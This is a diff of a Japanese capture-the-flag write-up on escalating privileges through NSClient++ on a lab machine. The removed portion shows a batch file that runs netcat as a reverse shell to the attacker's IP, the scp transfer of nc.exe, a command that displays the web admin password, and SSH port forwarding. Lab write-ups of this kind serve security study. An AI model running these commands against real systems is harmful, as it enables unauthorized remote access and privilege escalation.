@@ -258,7 +258,8 @@ nadine@SERVMON C:\Users\Nadine>dir "c:\Program Files"
               20 Dir(s)   6,112,477,184 bytes free
 ```
 nsclientには権限昇格のテクニックがあるらしい  
-ようは管理者権限で動作しているweb経由で攻撃者のプログラムを実行させるイメージ
+ようは管理者権限で動作しているweb経由で攻撃者のプログラムを実行させるイメージ  
+ただマシンがくそ重いので断念、なんかapi経由だと楽にエクスプロイトできるらしいけど
 ```sh
 └─$ searchsploit -m 46802
   Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
@@ -334,58 +335,3 @@ or
 Risk:
 The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
 ```
-PoCではweb経由で作業しているが、web操作はよくわからんかったのでコマンドライン上で実行  
-https://nsclient.org/docs/howto/external_scripts/  
-PoC２番目、必要モジュールの有効を確認
-```powershell
-nadine@SERVMON C:\Users\Nadine>type "C:\Program Files\NSClient++\nsclient.ini" | find "CheckExternalScripts"
-; CheckExternalScripts - Module used to execute external scripts
-CheckExternalScripts = enabled
-; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
-; External script settings - General settings for the external scripts module (CheckExternalScripts).
-
-nadine@SERVMON C:\Users\Nadine>type "C:\Program Files\NSClient++\nsclient.ini" | find "Scheduler"
-; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
-Scheduler = enabled
-; Schedules - Section for the Scheduler module.
-```
-PoC３番目のnc.exeとそれを実行するバッチを配送
-```sh
-└─$ cat test.bat                                     
-@echo off
-cmd /c "C:\Users\Nadine\nc.exe 10.10.16.28 4444 -e c:\windows\system32\cmd.exe" 
-                                                                                                                                                                       
-└─$ scp test.bat nadine@10.129.61.85:/Users/nadine/ 
-nadine@10.129.61.85's password: 
-test.bat                                                                                                                             100%   91     0.1KB/s   00:01
-
-└─$ cp /usr/share/windows-resources/binaries/nc.exe .
-
-└─$ scp nc.exe nadine@10.129.61.85:/Users/nadine/    
-nadine@10.129.61.85's password: 
-nc.exe                                                                                                                               100%   58KB  10.5KB/s   00:05
-```
-
-
-
-##　oha
-webログイン用のパスワード確認
-```powershell
-nadine@SERVMON C:\Users\Nadine>"C:\Program Files\NSClient++\nscp.exe" web -- password --display
-Current password: ew2x6SsGTxjRwXOT
-```
-なぜかパスワードログインできなかったが、設定ファイルを確認するとipアドレスでアクセス制限していた
-```powershell
-nadine@SERVMON C:\Users\Nadine>type "c:\program files\nsclient++\nsclient.ini" | find "127.0.0.1"
-allowed hosts = 127.0.0.1
-```
-ということでsshローカルポートフォワーディング
-```sh
-└─$ ssh -L 8443:127.0.0.1:8443 nadine@10.129.61.85       
-nadine@10.129.61.85's password: 
-Microsoft Windows [Version 10.0.17763.864]           
-(c) 2018 Microsoft Corporation. All rights reserved. 
-                                                     
-nadine@SERVMON C:\Users\Nadine>
-```
-
